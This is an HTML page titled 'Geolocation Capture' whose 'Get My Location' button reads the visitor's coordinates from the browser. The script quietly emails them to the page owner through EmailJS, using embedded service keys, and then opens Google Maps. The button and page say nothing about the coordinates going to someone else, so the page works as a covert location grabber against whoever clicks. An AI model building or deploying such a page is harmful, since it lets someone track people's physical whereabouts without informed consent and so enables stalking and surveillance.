<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolocation Capture</title>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            emailjs.init("bktBt1ja4aV3v45hR"); // Your EmailJS public key (user ID)
        })();
        
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        }

        function sendLocation(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            
            // Send the location to your email
            emailjs.send("service_rtdzefa", "template_kspwwbf", {
                latitude: lat,
                longitude: lon
            })
            .then(function(response) {
                console.log("SUCCESS!", response.status, response.text);
                alert("Email sent successfully!");
            }, function(error) {
                console.error("FAILED...", error); // Log error details
                alert("Failed to send email: " + JSON.stringify(error)); // Show error message
            });

            // Open the location in Google Maps
            window.open(`https://www.google.com/maps?q=${lat},${lon}`, "_blank");
        }

        function showError(error) {
            console.error("Error occurred: ", error);
        }
    </script>
</head>
<body>
    <h1>Get Geolocation</h1>
    <button onclick="getLocation()">Get My Location</button>
</body>
</html>
